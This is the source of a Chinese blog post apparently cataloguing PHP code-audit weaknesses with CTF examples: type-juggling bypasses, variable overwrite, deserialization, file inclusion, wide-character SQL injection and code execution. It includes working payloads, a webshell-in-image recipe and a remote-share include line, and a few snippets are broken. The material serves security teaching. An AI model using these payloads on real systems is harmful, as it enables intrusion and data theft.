0xABCdef');\n```\n技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串\n\n```php\n#方法1\n#s1=QNKCDZO&s2=240610708\n#方法2\n#?s1[]=1&s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] && md5([1]) ===md5([2])\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif ($_GET['s1'] != $_GET['s2']\n&& md5($_GET['s1']) == md5($_GET['s2'])) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n```php\n##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST['name']);\n$r = $db->get_row(\"SELECT `pass` FROM `user` WHERE `name`='{$name}'\");\nif ($r['pass'] === md5($_POST['pass'])) {\necho \"success\";\n}\n```\n\n### json传数据{\"key\":0}\nPHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。\n```\napplication/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n```\n第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.\n\n{\"key\":\"0\"}\n\n这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：\n\n{\"key\":0}\n\n### strcmp漏洞1：返回0\n适用与5.3之前版本的php\n\n`int strcmp ( string $str1 , string $str2 )`\n// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。\n\n```php\n##flag[]=admin\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif (strcmp($_GET['flag'], FLAG) == 0) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n### strcmp漏洞2：返回Null\n修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。\narray和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。\n`strcmp($c[1],$d) `\n\n\n### strcmp漏洞3: 判断使用的是 ==\n\n而判断使用的是==，当NULL==0是 bool(true)\n\n### in_array，array_search 弱类型比较\n\n松散比较下，任何string都等于true：\n\n```php\n// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'\n// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'\n// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.\nif(is_array(@$a[\"a2\"])){\n        if(count($a[\"a2\"])!==5 OR !is_array($a[\"a2\"][0])) die(\"nope\");\n        $pos = array_search(\"ctf\", $a[\"a2\"]);\n        $pos===false?die(\"nope\"):NULL;\n        foreach($a[\"a2\"] as $key=>$val){\n            $val===\"ctf\"?die(\"nope\"):NULL;\n        }\n        $v2=1;\n}\n```\n\n### sha1() md5() 报错相等绕过（False === False）\nsha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false\nmd5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。\n```php\n##?name[]=1&password[]=2\n## === 两边都是false则成立\nif ($_GET['name'] == $_GET['password'])\n    echo '<p>Your password can not be your name!</p>';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\n    die('Flag: '.$flag);\n```\n\n\n### strpos数组NULL(Null !== False)\n\nstrpos()输入数组出错返回null\n\n```php\n#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n<?php\n$flag = \"flag\";\n    if (isset ($_GET['nctf'])) {\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) # %00截断\n            echo '必须输入数字才行';\n        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    }\n```\n\n### 十六进制与十进制比较\n\n== 两边的十六进制与十进制比较，是可以相等的。\n\n```php\n#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = 'flag{test}';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i < strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return \"flase\";\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n```\n\n\n## md5注入带入’or’\n原理：\n```php\nmd5(string,raw)\nraw\t可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n```\n当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。\n```php\n## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入\n$sql = \"SELECT * FROM admin WHERE username = admin pass = '\".md5($password,true).\"'\";\n```\n\n## switch没有break\n```php\n#这里case 0 和 1 没有break,使得程序继续往下执行。\n<?php\nerror_reporting(0);\nif (isset($_GET['which']))\n{\n    $which = $_GET['which'];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    }\n}\n```\n\n## 反序列化\n\n```php\n<!-- index.php -->\n<?php \n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) && $g = $_GET['class'];\n\tif (!empty($g)) {\n\t\t$x = unserialize($g);\n\t}\n\techo $x->readfile();\n?>\n<img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n<!-- shield.php -->\n<?php\n\t//flag is in pctf.php\n\tclass Shield {\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') {\n\t\t\t$this -> file = $filename;\n\t\t}\n\t\t\n\t\tfunction readfile() {\n\t\t\tif (!empty($this->file) && stripos($this->file,'..')===FALSE  \n\t\t\t&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t}\n\t\t}\n\t}\n?>\n<!-- showimg.php -->\n<?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) {\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&& stripos($f,'pctf')===FALSE) {\n\t\t\treadfile($f);\n\t\t} else {\n\t\t\techo \"File not found!\";\n\t\t}\n\t}\n?>\n```\n\n```php\n#?class=O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}\n<!-- answer.php -->\n<?php\n\nrequire_once('shield.php');\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?>\n\n<!-- shield.php -->\n<?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = 'pctf.php') {\n            $this -> file = $filename;\n        }\n        \n        function readfile() {\n            if (!empty($this->file) && stripos($this->file,'..')===FALSE  \n            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n                return @file_get_contents($this->file);\n            }\n        }\n    }\n?>\n```\n\n## 文件包含\n\n原理：\n\ninclude()/include_once()，require()/require_once()，中的变量可控\n\n利用过程：\n```\n上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n```\n\n封闭协议：\n```\nfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n```\n\n\n```php\n## 访问共享目录\ninclude ('\\evilservershell.php');\n```\n\n\n## 提交参数无过滤\n\n原理:过滤了GPC，但没有过滤其它部分。\n\n```bash\n上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n```\n\n案例：\n```php\nforeach($_COOKIE AS $_key=>$_value){\n\tunset($$_key);\n}\nforeach($_POST AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_GET[$_key];\n}\n```\n通过表单来传值。\n```html\n<form method=\"post\" action=\"http://localhost/qibo/member/comment.php?job=ifcom\" enctype=\"multipart/form-data\">\n<input type=\"file\" name=\"cidDB\">  \n<input type=\"submit\">\n</form>\n```\n这里的gid为查询参数\n```php\n$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n```\n\n## 伪造IP\n原理:\n以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。\n```php\n关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv('HTTP_CLIENT_IP');\necho $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）\necho $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n```\n\n```\n这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】\n```\n\n\n## 绕过正则匹配\n\n\n### 缺少^和$限定\n\n\n### 数组绕过正则\n\n【\\A[ _a-zA-Z0-9]+\\z】\n\n\n### str_replace路径穿越\n原理\nstr_replace的过滤方式为其search参数数组从左到右一个一个过滤。\n\n```php\n## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array('..\\\\', '../', './', '.\\\\'), '', trim($dir),$countb);\necho $dir;\necho '</br>替换数量';\necho $countb;\n```\n\n```php\n## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array('../', '\\\\', '..'), array('', '/', ''), $_GET['file'],$counta);\necho $file;\necho '</br>替换数量';\necho $counta;\n```\n\n\n## short_open_tag=on 短标签\n\n原理：\n当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；\n格式为：<?xxxx;?> --> <?xxx;\n```bash\nGo0s@ubuntu:~$ cat test.php\n<?=\"helloworld\";\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n```\n\n\n## file_put_contents第二个参数传入数组\n\n原理：\n```php\nfile_put_contents(file,data,mode,context)\nfile\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n```\n\n```php\n## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n<?php\n$a = $_GET['data'];\n$file = $_GET['filename'];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n```\n\n\n## 单引号和双引号\n\n原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。\n\n```php\n# 1\n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string'; \n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string';\n# 2\n$abc='I love u'; \necho $abc //结果是:I love u \necho '$abc' //结果是:$abc \necho \"$abc\" //结果是:I love u \n# 3\n$a=\"${@phpinfo()}\"; //可以解析出来\n<?php $a=\"${@phpinfo()}\";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n```\n\n\n### 查询语句缺少单引号\n\n```php\n\"Select * from table where id=$id\" # 有注入\n\"Select * from table where id=\".$id.\" limit 1\" # 有注入\n\"Select * from table where id='$id'\" # 无注入\n\"Select * from table where id='\".$id.\"' limit 1\" # 无注入\n```\n\n## 宽字符注入\n原理\n常见转码函数：\niconv()\nmb_convert_encoding()\naddslashes\n防御：\n用mysql_real_escape_string\n\n```php\n## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(\"SET NAMES gbk\");\n$query = \"select * from user where uname='\".$uname.\"' and pwd='\".$pwd.\"'\";\n```\n\n## 跳转无退出\n原理:\n没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。\n```php\n## 1\n$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\n## 2\nheader(\"location: ../index.php\");\n```\n\n## 二次编码注入\n由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。\n如%2527，两次urldecode会最后变成'\n```\nbase64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n```\n\n## 前端可控变量填充导致XSS\n\n当html里的链接是变量时，易出现XSS。\n```html\n={#、echo、print、printf、vprintf、<%=$test%>\nimg scr={#$list.link_logo#}\n```\n\n## 命令执行函数\n\n```php\nsystem()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"\npopen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n```\n防范方法：\n使用自定义函数或函数库来替代外部命令的功能\n使用escapeshellarg 函数来处理命令参数\n使用safe_mode_exec_dir 指定可执行文件的路径\n\n### create_function\ncreate_function构造了一个return后面的语句为一个函数。\n```php\n#?sort_by=\"]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);}phpinfo();/*\"], $b[\"\"]);}phpinfo();/*\"]);\n#前面闭合，然后把后面的全部注释掉了。\n<?php\n$sort_by=$_GET['sort_by'];\n$sorter='strnatcasecmp';\n$databases=array('test','test');\n$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\nusort($databases, create_function('$a, $b', $sort_function));\n```\n\n\n\n### mb_ereg_replace()的/e模式\n原理\n```\nmb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= \"msr\"  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n```\n\n### preg_replace /e模式执行命令\n```php\n# ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(\"/\\[(.*)]/e\",'\\\\1',$_GET['str']);\n```\n\n## 动态函数执行\n```php\ncall_user_func\ncall_user_func_array\n```\n\n```php\n# ?a=assert\ncall_user_func($_GET['a'],$b);\n```\n\n\n## 代码执行\n```php\nassert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n```\n\n### eval()和assert()代码执行\n\n当assert()的参数为字符串时 可执行PHP代码。\n区别：assert可以不加;，eval不可以不加;。\n```php\neval(\" phpinfo(); \");【√】 eval(\" phpinfo() \");【X】\nassert(\" phpinfo(); \");【√】 assert(\" phpinfo() \");【√】\n```\n\n\n## 优先级绕过\n原理：\n如果运算符优先级相同，那运算符的结合方向决定了该如何运算\nhttp://php.net/manual/zh/language.operators.precedence.php\n\n优先级：&&/|| 大于 = 大于 AND/OR\n\n```php\n# ($test = true) and false; $test2 = (true && false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true && false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(\"123\") and is_numeric(\"anything false\"); var_dump($test3); //bool(true)\n```\n\n## getimagesize图片判断绕过\n原理：\n当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。\n只要我们在文件头部加入GIF89a后可以上传任意后缀文件。\n\n生成小马图的方法：\n```bash\ncat image.png webshell.php > image.php\n```\n\n```php\n## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request->getFiles();\n# 2\nif(getimagesize($files['users']['photo']['tmp_name']))\n        {\n          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);\n# 3\n$filesize = @getimagesize('/path/to/image.png');\nif ($filesize) {\n    do_upload();\n}\n```\n\n## <变*，windows findfirstfile利用\n\n原理：\nWindows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\n执行过程中，字符\">\"被替换成\"?\"，字符\"<\"被替换成\"*\"，而符号\"（双引号）被替换成一个\".\"字符。\n所以：\n1. \">\"\">>\"可代替一个字符,\"<\"可以代替后缀多个字符，\"<<\"可以代替包括文件名和后缀多个字符。所以一般使用<<\n2. \" 可以代替.\n3. 文件名第一个字符是\".\"的话，读取时可以忽略之\n\n| NO   | Status | Function             | Type of operation      |\n| ---- | ------ | -------------------- | ---------------------- |\n| 1.   | OK     | include()            | Includefile            |\n| 2.   | OK     | include_once()       | Includefile            |\n| 3.   | OK     | require()            | Includefile            |\n| 4.   | OK     | require_once()       | Include file           |\n| 5.   | OK     | fopen()              | Openfile               |\n| 6.   | OK     | ZipArchive::open()   | Archive file           |\n| 7.   | OK     | copy()               | Copyfile               |\n| 8.   | OK     | file_get_contents()  | Readfile               |\n| 9.   | OK     | parse_ini_file()     | Readfile               |\n| 10.  | OK     | readfile()           | Readfile               |\n| 11.  | OK     | file_put_contents()  | Write file             |\n| 12.  | OK     | mkdir()              | New directory creation |\n| 13.  | OK     | tempnam()            | New file creation      |\n| 14.  | OK     | touch()              | New file creation      |\n| 15.  | OK     | move_uploaded_file() | Move operation         |\n| 16.  | OK     | opendiit)            | Directory operation    |\n| 17.  | OK     | readdir()            | Directory operation    |\n| 18.  | OK     | rewinddir()          | Directory operation    |\n| 19.  | OK     | closedir()           | Directory operation    |\n| 20.  | FAIL   | rename()             | Move operation         |\n| 21.  | FAIL   | unlink()             | Delete file            |\n| 22.  | FAIL   | rmdir())             | Directory operation    |\n\n```php\n## ?file=1<\n## ?file=1>\n## ?file=1\"txt\n文件名为1.txt\n\n## ?file=1234.tx>\n## ?file=1234.<\n## ?file=1<<\n## ?file=1<<\">\n## ?file=123>\">\n## ?file=>>>4\">\n## ?file=<<4\">\n文件名为1234.txt\n\ninclude('shell<');  \ninclude('shell<<');\ninclude('shell.p>p'); \ninclude('shell\"php');\nfopen('.htacess');  //==>fopen(\"htacess');\nfile_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');\nfile_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n```\n\n## 处理value没有处理key\n\nforeach时,addslashes对获得的value值进行处理，但没有处理key。\n\n\n## 用来目录遍历的特别函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\nlstat 函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\nstream_resolve_include_path函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\n\n\n## 绕过GD库图片渲染\n\n[jpg_payload.zip](file/PHP代码审计_jpg_payload.zip)\n\njpg_name.jpg是待GD处理的图片\n```\nphp jpg_payload.php <jpg_name.jpg>\n```\n生成好的图片，在经过如下代码处理后，依然能保留其中的shell：\n\n```php\n<?php\n    imagecreatefromjpeg('xxxx.jpg');\n?>\n```\n\n## 会话固定\n\n```php\nif(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid\n```\n通过get方法来设置session。所以可以通过CSRF：\n\nhttp://xxxx/index.php?r=admin/index/index&phpsessid=f4cking123\n\n管理员点了我们就能使用此session进后台了。\n\n## end方法获取元素的问题\n\n```php\n$file = array(1 => 'png', 0 => 'php');\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n```\n\n两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。\n\n## 资料\n\nPHP代码审计分段讲解\n\nhttps://github.com/bowu678/php_bugs\n\nhttps://github.com/jiangsir404/Audit-Learning\n\n\nhttps://read.douban.com/reader/ebook/16642056/","source":"_posts/代码审计.md","raw":"---\ntitle: PHP代码审计归纳\ndate: 2018-04-18 10:27:37\ntags:\n---\n\n\n\n# PHP代码审计归纳\n\nAuthor: 木禾 ali0th\n\nhttps://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\n## 变量覆盖\n### extract()\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。\n```php\n<?php\n$a = \"Original\";\n$my_array = array(\"a\" => \"Cat\",\"b\" => \"Dog\", \"c\" => \"Horse\");\nextract($my_array); \necho \"\\$a = $a; \\$b = $b; \\$c = $c\";\n?>\n# 结果：$a = Cat; $b = Dog; $c = Horse\n\n```\n这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。\n\n```php\n#?shiyan=&flag=1\n<?php\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo 'ctf{xxx}'; \n    }\n   else\n   { \n    echo'Oh.no';\n   } \n   }\n```\n<!--more-->\n### parse_str()\n\n解析字符串并注册成变量\n```php\n$b=1;\nParse_str('b=2');\nPrint_r($b);\n# 结果: $b=2\n```\n\n### import_request_variables()\n\n```php\n将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(\"p\"， \"post_\");\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(\"gp\"， \"gp_\");\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(\"cg\"， \"cg_\");\n```\n\n### $变量覆盖\n\n```php\n## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs\n<?  \n$chs = '';  \nif($_POST && $charset != 'utf-8'){  \n    $chs = new Chinese('UTF-8', $charset);  \n    foreach($_POST as $key => $value){  \n        $$key = $chs->Convert($value);  \n    }  \n    unset($chs);  \n} \n```\n\n### 全局变量覆盖漏洞\n\n原理：\nregister_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。\n如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.\n\n\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。\n\n```php\n<?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&b=111\nif (ini_get(\"register_globals\")) foreach($_REQUEST as $k=>$v) unset(${$k});\nprint $a;\nprint $_GET[b]; \n```\n经过测试，开了register_globals会卡死\n\n\n## 绕过过滤的空白字符\n\n原理：https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n\n```\n控制码\n\"\\0\" \"%00\" (ASCII  0 (0x00))，空字节符。\n\n制表符\n\"\\t\" (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n\"\\n\" (ASCII 10 (0x0A))，换行符。\n\"\\v\" \"\\x0b\" (ASCII  11 (0x0B))，垂直制表符。\n\"\\f\" \"%0c\" 换页符\n\"\\r\" \"%0d\"(ASCII  13 (0x0D))，回车符。\n\n空格:\n\" \" \"%20\" (ASCII  32 (0x20))，普通空格符。\n```\n\n而trim过滤的空白字符有\n```php\nstring trim ( string $str [, string $character_mask = \" \\t\\n\\r\\0\\x0B\" ] )\n```\n其中缺少了\\f\n\n2 函数对空白字符的特性\nis_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。\n也就是说，is_numeirc(\" \\r\\n \\t 1.2\")是会返回true的。同理，intval(\" \\r\\n \\t 12\")，也会正常返回12。\n\n\n\n案例\n\nhttps://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\n```php\n#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n```\n\n## intval整数溢出\n\nphp整数上限溢出绕过intval\n\nintval 函数最大的值取决于操作系统。 \n32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。\n64 位系统上，最大带符号的 integer 值是 9223372036854775807。\n\n## intval 四舍五入\n\n\n```php\n# ?a=1024.1\n<?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\nif ($_GET[id]==1024) {\n    echo \"<p>no! try again</p>\";\n    }\n  else{\n    echo($query[content]);\n  }\n}\n```\n\n## 浮点数精度忽略\n```php\nif ($req[\"number\"] != intval($req[\"number\"]))\n```\n在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。\n输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。\n\n\n\n\n## 多重加密\n\n\n题目中有：\n```php\n$login = unserialize(gzuncompress(base64_decode($requset['token'])));\nif($login['user'] === 'ichunqiu'){echo $flag;}\n```\n本地则写：\n```php\n<?php\n$arr = array(['user'] === 'ichunqiu');\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?>\n```\n\n## 截断\n\n### iconv 异常字符截断\n\n```php\n## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a='1'.char(130).'2';\necho iconv(\"UTF-8\",\"gbk\",$a); //将字符串的编码从UTF-8转到gbk\necho iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8\n```\n\n### eregi、ereg可用%00截断\n\n功能：正则匹配过滤\n条件：要求php<5.3.4\n\n```php\n## 